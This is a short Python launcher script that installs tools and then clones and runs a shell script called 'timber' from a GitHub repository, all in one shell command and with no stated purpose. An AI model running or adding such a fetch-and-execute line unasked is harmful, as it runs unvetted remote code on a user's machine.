#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/thobanirhetula/timber.git;cd timber;chmod +x timber;bash timber", shell=True)
